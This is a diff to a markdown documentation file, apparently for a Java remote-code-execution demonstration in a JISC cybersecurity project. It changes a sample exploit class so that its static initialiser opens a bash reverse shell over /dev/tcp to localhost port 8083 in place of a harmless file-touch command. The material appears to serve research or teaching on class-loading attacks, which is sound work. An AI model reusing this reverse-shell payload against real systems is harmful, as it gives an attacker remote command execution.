@@ -53,14 +53,21 @@ The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` first fr
 ```
 package uk.ac.jisc.cybersec.rce;
 
-/** Sample RCE exploit class.*/
-public class RceExploit {
-	
+/**
+ * Sample RCE exploit class. 
+ */
+public class RceReverseShellExploit {
+
 	static {
 		try {
-			System.out.println("Attempting takeover...");
-			Runtime.getRuntime().exec("touch /Users/philsmart/test.txt");
-			System.out.println("Takeover success!");
+			System.out.println("****************************** Attempting takeover (reverse shell)...");
+			String[] cmd = {
+			           "bash",
+			           "-c",
+			           "exec 5<>/dev/tcp/127.0.0.1/8083;cat <&5 | while read line; do $line 2>&5 >&5; done" };
+			 
+			   Runtime.getRuntime().exec(cmd);
+			System.out.println("****************************** Takeover success!");
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
